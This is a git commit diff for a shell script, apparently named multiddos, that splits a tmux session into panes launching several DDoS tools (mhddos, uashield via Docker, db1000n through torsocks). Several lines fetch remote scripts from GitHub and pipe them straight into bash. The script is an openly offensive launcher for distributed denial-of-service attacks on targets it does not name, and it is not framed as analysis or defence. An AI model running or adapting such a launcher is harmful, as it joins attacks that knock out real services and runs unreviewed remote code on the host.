0ee1b2d961c73f867c1e746841937afdc69f38b2
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-08 23:17:51 +0300

    Update and rename multiddos_test.sh to test.sh

--- test.sh
+++ test.sh
@@ -22,14 +22,14 @@ fi
 
 tmux new-session -s multiddos -d
 sleep 0.1
-tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
+tmux split-window -h -p 75 'gotop -asc solarized'
 sleep 0.1
 #tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
 sleep 0.1
-tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash
+tmux split-window -v 'curl https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash
  && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux select-pane -t 0
-gotop -asc solarized
+curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash
 tmux -2 attach-session -d
